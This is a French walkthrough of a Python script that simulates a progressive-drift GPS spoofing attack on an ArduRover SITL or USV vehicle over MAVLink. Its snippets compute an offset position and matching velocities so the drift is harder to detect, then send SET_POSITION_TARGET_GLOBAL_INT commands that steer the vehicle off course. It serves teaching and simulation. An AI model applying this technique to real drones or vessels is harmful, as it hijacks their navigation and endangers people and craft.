# GPS Drift Spoofer

## Vue générale

Ce script simule une attaque de type **GPS Spoofing par dérive progressive** sur un véhicule **ArduRover SITL / USV** via le protocole **MAVLink**.

Le principe :

```text
1. Lire la vraie position GPS
2. Calculer une fausse position progressivement décalée
3. Envoyer cette position au véhicule
4. Le véhicule dérive progressivement
```


---

## Imports

```python
from pymavlink import mavutil
```

`pymavlink` est la bibliothèque qui parle le protocole **MAVLink** — le langage de communication entre un GCS (QGC) et un drone/USV.

Elle sait :
- encoder les messages MAVLink,
- décoder les messages MAVLink,
- envoyer des commandes à ArduPilot.

---

# `compute_drift` — Le cœur mathématique

```python
def compute_drift(real: Dict, rate: float, direction_rad: float, elapsed: float) -> Dict:
```

Cette fonction :
- prend la vraie position GPS,
- calcule une dérive progressive,
- retourne une position spoofée.

---

## Étape 1 — Distance parcourue

```python
dist = rate * elapsed
```

Formule physique :

```math
d = v \times t
```

Exemple :

- `rate = 0.5 m/s`
- `elapsed = 60 s`

Alors :

```text
dist = 30 m
```

---

## Étape 2 — Conversion mètres → degrés GPS

```python
d_lat = (dist * math.cos(direction_rad)) / 111_111.0
```

### Pourquoi `111111` ?

Approximation terrestre :

```text
1 degré de latitude ≈ 111111 mètres
```

---

### Comprendre `cos(direction)`

- `0°` → Nord
- `90°` → Est
- `180°` → Sud
- `270°` → Ouest

Donc :

```python
math.cos(direction)
```

donne la composante Nord/Sud.

---

## Longitude

```python
d_lon = (dist * math.sin(direction_rad)) / (111_111.0 * math.cos(math.radians(real["lat"])))
```

La longitude dépend de la latitude terrestre.

À l’équateur :

```text
1 degré longitude ≈ 111111 m
```

Mais à Brest (~48°N) :

```text
111111 × cos(48°) ≈ 74000 m
```

Donc le `cos(latitude)` corrige la projection terrestre.

---

# Étape 3 — Construction du GPS spoofé

```python
s = real.copy()
```

Copie toutes les valeurs réelles.

---

## Application du décalage GPS

```python
s["lat"] = real["lat"] + d_lat
s["lon"] = real["lon"] + d_lon
```

Le GPS devient progressivement faux.

---

# Vitesse spoofée cohérente

```python
s["vn"]  = real.get("vn", 0.0) + rate * math.cos(direction_rad)
s["ve"]  = real.get("ve", 0.0) + rate * math.sin(direction_rad)
```

- `vn` = vitesse Nord
- `ve` = vitesse Est

---

## Pourquoi modifier la vitesse ?

Sinon :
- la position GPS changerait,
- mais la vitesse resterait identique,
- ce serait détectable immédiatement.

Le spoofing devient donc plus réaliste.

---

# `send_position` — Injection MAVLink

---

## TYPE_MASK

```python
TYPE_MASK = 0b0000_1111_1000
```

Masque binaire MAVLink sur 16 bits.

Chaque bit :
- `1` → ignorer ce champ,
- `0` → utiliser ce champ.

---

## Structure binaire

```text
bit 11 10  9  8  7  6  5  4  3  2  1  0
      0  0  0  0  1  1  1  1  1  0  0  0
                  ↑acc ignorée   ↑pos+vel actifs
```

---

## Commande MAVLink envoyée

```python
mav.mav.set_position_target_global_int_send(...)
```

Envoie le message MAVLink :

```text
SET_POSITION_TARGET_GLOBAL_INT
```

---

# Signification de la commande

Elle dit au rover :

```text
Déplace-toi vers cette position GPS
```

Donc :
- le rover reçoit une fausse cible,
- il commence à dériver réellement.

---

# Timestamp MAVLink

```python
int(time.time() * 1000) & 0xFFFFFFFF
```

Temps en millisecondes.

`& 0xFFFFFFFF` :
- force la valeur sur 32 bits,
- conforme au protocole MAVLink.

---

# target_system

```python
mav.target_system
```

ID MAVLink du véhicule.

Exemple :
- `1` → ArduRover principal.

---

# target_component

```python
mav.target_component
```

ID du composant MAVLink.

Exemple :
- `1` → autopilot.

---

# Frame GPS

```python
MAV_FRAME_GLOBAL_RELATIVE_ALT_INT
```

Référentiel :
- latitude,
- longitude,
- altitude relative.

---

# Format latitude MAVLink

```python
int(s["lat"] * 1e7)
```

MAVLink stocke les coordonnées GPS en :

```text
degrés × 10^7
```

---

## Exemple

```text
48.350000°
→ 483500000
```

Pourquoi ?
- éviter les flottants,
- améliorer précision et portabilité.

---

# Altitude relative

```python
float(s.get("rel_alt", 0.0))
```

Pour un USV :
- altitude ≈ 0.

---

# Vitesse Nord / Est

```python
float(s.get("vn", 0.0))
float(s.get("ve", 0.0))
```

Vitesses en :
- m/s.

---

# Champs ignorés

```python
0.0, 0.0, 0.0
```

Accélérations ignorées.

---

```python
0.0, 0.0
```

Yaw et yaw rate ignorés.

---

# `main` — La boucle de contrôle

---

# Connexion MAVLink

```python
mav = mavutil.mavlink_connection(args.connection, autoreconnect=True)
```

Ouvre une connexion MAVLink UDP.

Exemple :

```text
udp:0.0.0.0:14552
```

---

# Heartbeat

```python
mav.wait_heartbeat(timeout=30)
```

Attend un message MAVLink `HEARTBEAT`.

---

## Pourquoi c’est important ?

Sans heartbeat :
- `target_system = 0`,
- les commandes sont ignorées.

Le HEARTBEAT est le "ping" MAVLink envoyé chaque seconde par ArduPilot.

---

# Demande de flux MAVLink

```python
mav.mav.request_data_stream_send(
    mav.target_system,
    mav.target_component,
    mavutil.mavlink.MAV_DATA_STREAM_ALL,
    10,
    1
)
```

Demande :
- tous les flux MAVLink,
- à 10 Hz.

---

# Lecture des messages MAVLink

```python
msg = mav.recv_match(
    type=["GPS_RAW_INT", "GLOBAL_POSITION_INT"],
    blocking=True,
    timeout=1.0
)
```

Attend :
- `GPS_RAW_INT`
- ou `GLOBAL_POSITION_INT`.

---

# `GPS_RAW_INT`

Contient :
- latitude,
- longitude,
- altitude,
- satellites,
- HDOP.

---

# Conversion MAVLink → humain

```python
msg.lat / 1e7
```

car MAVLink utilise :
- degrés × 1e7.

---

# Altitude

```python
msg.alt / 1000.0
```

MAVLink stocke :
- altitude en millimètres.

---

# HDOP

```python
msg.eph / 100.0
```

`eph` :
- erreur horizontale GPS ×100.

---

# `GLOBAL_POSITION_INT`

Contient :
- vitesse Nord (`vx`)
- vitesse Est (`vy`)
- altitude relative.

---

# Conversion vitesses

```python
msg.vx / 100.0
```

MAVLink stocke :
- vitesse en cm/s.

Conversion :
- cm/s → m/s.

---

# Machine d’état temporelle

---

## Temps écoulé

```python
elapsed = time.time() - t_start
```

Temps depuis lancement script.

---

# Déclenchement attaque

```python
if elapsed >= args.pre_attack:
```

Quand le délai est dépassé :
→ l’attaque commence.

---

# Première activation

```python
if t_attack is None:
```

Évite de réinitialiser l’attaque à chaque boucle.

---

# Début réel attaque

```python
t_attack = time.time()
```

Instant exact du démarrage.

---

# Génération du spoofing

```python
spoof = compute_drift(...)
```

Calcule la fausse position.

---

# Injection MAVLink

```python
send_position(mav, spoof)
```

Le rover reçoit :
- la fausse cible GPS.

---

# Compteur de commandes

```python
cmds += 1
```

Nombre de commandes spoofées envoyées.

---

# Affichage non bloquant

```python
if now - last_disp < 0.25:
    continue
```

Limite affichage :
- 4 fois/seconde.

---

# Mise à jour console

```python
print(..., end="", flush=True)
```

- `\r` → retour début ligne,
- `end=""` → pas de saut de ligne,
- `flush=True` → affichage immédiat.
